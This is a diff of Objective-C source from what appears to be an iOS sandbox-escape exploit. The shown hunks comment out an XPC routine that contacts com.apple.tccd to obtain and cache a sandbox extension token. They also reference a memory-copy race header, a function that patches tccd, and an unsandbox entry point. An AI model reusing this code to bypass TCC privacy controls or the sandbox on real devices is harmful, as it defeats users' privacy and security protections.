@@ -12,7 +12,7 @@
 #import "helpers.h"
 #import "vm_unaligned_copy_switch_race.h"
 
-typedef NSObject* xpc_object_t;
+//typedef NSObject* xpc_object_t;
 typedef xpc_object_t xpc_connection_t;
 typedef void (^xpc_handler_t)(xpc_object_t object);
 xpc_object_t xpc_dictionary_create(const char* const _Nonnull* keys,
@@ -192,12 +192,12 @@ static void call_tccd(void (^completion)(NSString* _Nullable extension_token)) {
   // reimplmentation of TCCAccessRequest, as we need to grab and cache the sandbox token so we can
   // re-use it until next reboot.
   // Returns the sandbox token if there is one, or nil if there isn't one.
-  xpc_connection_t connection = xpc_connection_create_mach_service(
-      "com.apple.tccd", dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), 0);
-  xpc_connection_set_event_handler(connection, ^(xpc_object_t object) {
-    NSLog(@"xpc event handler: %@", object);
-  });
-  xpc_connection_resume(connection);
+//  xpc_connection_t connection = xpc_connection_create_mach_service(
+//      "com.apple.tccd", dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), 0);
+//  xpc_connection_set_event_handler(connection, ^(xpc_object_t object) {
+//    NSLog(@"xpc event handler: %@", object);
+//  });
+//  xpc_connection_resume(connection);
   const char* keys[] = {
       "TCCD_MSG_ID",  "function",           "service", "require_purpose", "preflight",
       "target_token", "background_session",
@@ -217,26 +217,26 @@ static void call_tccd(void (^completion)(NSString* _Nullable extension_token)) {
   NSLog(@"%@", response_message);
 
 #endif
-  xpc_connection_send_message_with_reply(
-      connection, request_message, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0),
-      ^(xpc_object_t object) {
-        if (!object) {
-          NSLog(@"object is nil???");
-          completion(nil);
-          return;
-        }
-        NSLog(@"response: %@", object);
-        if ([object isKindOfClass:NSClassFromString(@"OS_xpc_error")]) {
-          NSLog(@"xpc error?");
-          completion(nil);
-          return;
-        }
-        NSLog(@"debug description: %@", [object debugDescription]);
-        const char* extension_string = xpc_dictionary_get_string(object, "extension");
-        NSString* extension_nsstring =
-            extension_string ? [NSString stringWithUTF8String:extension_string] : nil;
-        completion(extension_nsstring);
-      });
+//  xpc_connection_send_message_with_reply(
+//      connection, request_message, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0),
+//      ^(xpc_object_t object) {
+//        if (!object) {
+//          NSLog(@"object is nil???");
+//          completion(nil);
+//          return;
+//        }
+//        NSLog(@"response: %@", object);
+//        if ([object isKindOfClass:NSClassFromString(@"OS_xpc_error")]) {
+//          NSLog(@"xpc error?");
+//          completion(nil);
+//          return;
+//        }
+//        NSLog(@"debug description: %@", [object debugDescription]);
+//        const char* extension_string = xpc_dictionary_get_string(object, "extension");
+//        NSString* extension_nsstring =
+//            extension_string ? [NSString stringWithUTF8String:extension_string] : nil;
+//        completion(extension_nsstring);
+//      });
 }
 
 static NSData* patchTCCD(void* executableMap, size_t executableLength) {
@@ -618,3 +618,5 @@ int do_unsandbox(void) {
     
     return 0;
 }
+
+
